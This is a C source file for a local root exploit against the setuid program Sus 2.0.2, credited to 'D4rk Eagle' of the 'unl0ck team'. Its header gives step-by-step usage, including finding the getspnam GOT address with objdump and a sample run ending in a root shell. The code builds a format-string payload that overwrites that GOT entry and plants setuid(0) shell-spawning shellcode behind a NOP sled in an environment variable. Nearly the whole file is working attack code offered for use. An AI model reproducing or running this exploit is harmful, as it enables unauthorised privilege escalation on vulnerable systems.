/*				Sus 2.0.2 local root exploit

tested on Red Hat and Solaris. 
usage: 
./unsus -o offset -g GOT address of getspnam() function

example: 

[root@localhost home]# objdump -R /usr/bin/sus | grep getspnam
 
/usr/bin/sus:     file format elf32-i386

8049608 R_386_JUMP_SLOT getspnam
[root@localhost home]# gcc unsus.c -o unsus
[root@localhost home]# ./unsus
 
Sus 2.0.2 local root exploit
by D4rk Eagle
unl0ck team [http://unl0ck.blackhatz.info]
 
usage: unsus [options]
 
Options:
-o [offset] -g [GOT]
 
[root@localhost home]# ./unsus -o 2000 -g 0x8049608
                                                                                
Using: retaddr = 0xbffffe88, GOT = 0x8049608, OFFSET = 2000
                                                                                
sh-2.05b#

		IT'S ALL :)

Greetz to: 

tal0n, n3o, stine, nekd0, mihey, b0r0dat0r, xoce, cr0n, f00n, xbIx, Darksock, forsyte.
					
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <getopt.h>

#define BIN "/usr/bin/sus"

char buf[100];

char shallcode[] = // unl0ck team demo shellcode :) example without setuid(0)
"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
"\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

char shellcode[] = // 1337 unl0ck team small shellcode with setuid(0) ;) 
"\x31\xc0\x31\xdb\xb0\x17\xcd\x80"
"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
"\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

long getsp() {
__asm__("movl %esp,%eax");
}

// format string creator | xCrZx idea.
char *fmt_str_creator(long GOT, long RET, int ALIGN) {

	long high,low;
	memset(buf,0x00,sizeof(buf));

	high=(RET >> 16) & 0xffff; 
	low = RET & 0xffff;

	sprintf(buf,"%c%c%c%c%c%c%c%c%%.%dx%%%d$hn%%.%dx%%%d$hn",
	(char)((GOT&0xff)+2),(char)((GOT>>8)&0xff),(char)((GOT>>16)&0xff),(char)((GOT>>24)&0xff),
	(char)(GOT&0xff),(char)((GOT>>8)&0xff),(char)((GOT>>16)&0xff),(char)((GOT>>24)&0xff),
	(high>low)?(low-8):(high-8),
	(high>low)?(ALIGN+1):(ALIGN),
	(high>low)?(high-low):(low-high),
	(high>low)?(ALIGN):(ALIGN+1));

	return buf;


}

void usage() { 
printf("\nSus 2.0.2 local root exploit\nby D4rk Eagle\nunl0ck team [http://unl0ck.blackhatz.info]\n\n");
printf("usage: unsus [options]\n\nOptions:\n-o [offset] -g [GOT]\n\n");
exit(0);
}


int main(int argc, char **argv) {

	long GOT;
	long RET;
	int ALIGN = 2, off = 0, opt;

	char *av[3], *ev[2];
	char *hack, buff[100];

	hack = (char *)malloc(2000);
	sprintf(hack, "HACK=");

	if ( argc < 4 ) { usage(); exit(0); }

while ((opt = getopt(argc, argv, "o:g:")) != -1) 
{
		switch (opt) {

		case 'o':
			off = atoi(optarg);
			break;

		case 'g':
			sscanf(optarg, "0x%x", &GOT);
			break;

		default:
			usage();
		}
}

        memset(hack + 5, 0x90, 1000-1-strlen(shellcode));
	sprintf(hack + 1000 - strlen(shellcode), "%s", shellcode);

        RET = getsp()+off;
	printf("\nUsing: retaddr = 0x%x, GOT = 0x%x, OFFSET = %d\n\n", RET, GOT, off);
	memset(buff,0x00,sizeof(buf));
	sprintf(buff,"%s",fmt_str_creator(GOT+4,RET,ALIGN));

        av[0] = BIN;
        av[1] = buff;
        av[2] = 0;
        ev[0] = hack;
        ev[1] = 0;
        execve(*av, av, ev);

	return 0;
}
